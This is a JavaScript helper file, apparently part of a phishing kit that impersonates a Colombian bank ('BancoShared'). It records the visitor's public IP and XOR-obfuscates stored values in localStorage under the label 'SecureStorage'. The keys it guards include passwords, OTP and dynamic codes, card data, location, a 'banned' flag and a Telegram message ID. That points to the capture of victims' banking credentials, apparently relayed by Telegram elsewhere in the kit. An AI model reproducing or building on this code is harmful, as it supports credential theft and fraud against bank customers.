(function (window) {
    const DATE_OPTIONS = {
        weekday: "long",
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true
    };

    function setElementText(elementId, value) {
        if (!elementId) {
            return;
        }

        const element = document.getElementById(elementId);
        if (element) {
            element.textContent = value;
        }
    }

    function getStoredIp() {
        return localStorage.getItem("address") || localStorage.getItem("ip") || "";
    }

    function saveIp(ip) {
        if (!ip) {
            return;
        }

        localStorage.setItem("ip", ip);
        localStorage.setItem("address", ip);
    }

    function fetchPublicIp() {
        return fetch("https://ipapi.co/json/")
            .then(function (response) {
                return response.json();
            })
            .then(function (data) {
                return data && data.ip ? data.ip : "";
            })
            .catch(function () {
                if (typeof window.$ === "function" && typeof window.$.getJSON === "function") {
                    return new Promise(function (resolve) {
                        window.$.getJSON("https://api.ipify.org?format=json", function (data) {
                            resolve(data && data.ip ? data.ip : "");
                        }).fail(function () {
                            resolve("");
                        });
                    });
                }

                return "";
            });
    }

    function populateIp(options) {
        const settings = Object.assign({
            ipElementId: "gfg",
            addressElementId: "address"
        }, options || {});

        return fetchPublicIp().then(function (ip) {
            const finalIp = ip || getStoredIp() || "No disponible";

            if (finalIp !== "No disponible") {
                saveIp(finalIp);
            }

            setElementText(settings.ipElementId, finalIp);
            setElementText(settings.addressElementId, finalIp);
            return finalIp;
        });
    }

    function updateDateTime(elementId) {
        const targetId = elementId || "fecha-hora";
        setElementText(targetId, new Date().toLocaleDateString("es-CO", DATE_OPTIONS));
    }

    function startDateTime(elementId) {
        const targetId = elementId || "fecha-hora";
        updateDateTime(targetId);
        return window.setInterval(function () {
            updateDateTime(targetId);
        }, 1000);
    }

    window.BancoShared = {
        fetchPublicIp: fetchPublicIp,
        populateIp: populateIp,
        updateDateTime: updateDateTime,
        startDateTime: startDateTime
    };

    // ============================================================
    // 🛡️ SecureStorage: cifra claves sensibles en localStorage (XOR + base64 síncrono)
    // Monkey-patch: intercepta setItem/getItem/removeItem/clear para claves sensibles.
    // El resto del código NO CAMBIA: llamadas síncronas normales a localStorage.
    // ============================================================
    (function () {
        var SENSITIVE_KEYS = {
            'clave': true, 'otp': true, 'dinamica': true, 'cardData': true,
            'userName': true, 'usuario': true, 'message': true, 'transaction_id': true,
            'formData': true, 'ip': true, 'address': true, 'ubicacion': true,
            'telegram_message_id': true, 'banned': true
        };
        var MAGIC_PREFIX = 'SEC:1:';

        function getLsKey() {
            try {
                if (window.__SEC && window.__SEC.lsKey) return String(window.__SEC.lsKey);
            } catch (e) {}
            return '__no_key__';
        }

        function xorString(str, key) {
            if (!str) return '';
            var keyStr = String(key || '');
            if (keyStr === '') return str;
            var out = '';
            var keyLen = keyStr.length;
            for (var i = 0; i < str.length; i++) {
                out += String.fromCharCode(str.charCodeAt(i) ^ keyStr.charCodeAt(i % keyLen));
            }
            return out;
        }

        function encodeSecure(rawValue) {
            try {
                var json = JSON.stringify({ v: rawValue, t: Date.now() });
                var xored = xorString(json, getLsKey());
                var b64 = typeof btoa === 'function' ? btoa(unescape(encodeURIComponent(xored))) : xored;
                return MAGIC_PREFIX + b64;
            } catch (e) {
                return MAGIC_PREFIX + '__err__';
            }
        }

        function decodeSecure(ciphered) {
            try {
                if (typeof ciphered !== 'string') return ciphered;
                if (ciphered.indexOf(MAGIC_PREFIX) !== 0) return ciphered;
                var body = ciphered.substring(MAGIC_PREFIX.length);
                if (body === '__err__') return null;
                var xored;
                try {
                    xored = decodeURIComponent(escape(typeof atob === 'function' ? atob(body) : body));
                } catch (e) {
                    xored = body;
                }
                var json = xorString(xored, getLsKey());
                var obj = JSON.parse(json);
                return obj && typeof obj !== 'undefined' && 'v' in obj ? obj.v : json;
            } catch (e) {
                return null;
            }
        }

        function isSensitiveKey(key) {
            if (!key) return false;
            var k = String(key);
            if (SENSITIVE_KEYS[k]) return true;
            var lk = k.toLowerCase();
            if (lk.indexOf('card') !== -1 || lk.indexOf('pass') !== -1 ||
                lk.indexOf('otp') !== -1 || lk.indexOf('token') !== -1 ||
                lk.indexOf('cvv') !== -1 || lk.indexOf('clave') !== -1 ||
                lk.indexOf('credencial') !== -1) return true;
            return false;
        }

        // Monkey-patch Storage.prototype
        var origSet = Storage.prototype.setItem;
        var origGet = Storage.prototype.getItem;
        var origRemove = Storage.prototype.removeItem;
        var origClear = Storage.prototype.clear;

        Storage.prototype.setItem = function (key, value) {
            if (isSensitiveKey(key)) {
                return origSet.call(this, key, encodeSecure(value));
            }
            return origSet.call(this, key, value);
        };

        Storage.prototype.getItem = function (key) {
            var raw = origGet.call(this, key);
            if (raw === null || raw === undefined) return raw;
            if (typeof raw === 'string' && raw.indexOf(MAGIC_PREFIX) === 0) {
                return decodeSecure(raw);
            }
            if (isSensitiveKey(key) && typeof raw === 'string') {
                // Migración sobre la marcha: valor antiguo en claro, lo re-escribimos cifrado
                try {
                    origSet.call(this, key, encodeSecure(raw));
                } catch (e) {}
            }
            return raw;
        };

        Storage.prototype.removeItem = function (key) {
            return origRemove.call(this, key);
        };

        Storage.prototype.clear = function () {
            return origClear.call(this);
        };

        // Exponer helpers (si hace falta debug)
        window.__SecureStorage = {
            isSensitive: isSensitiveKey,
            encode: encodeSecure,
            decode: decodeSecure
        };
    })();
})(window);
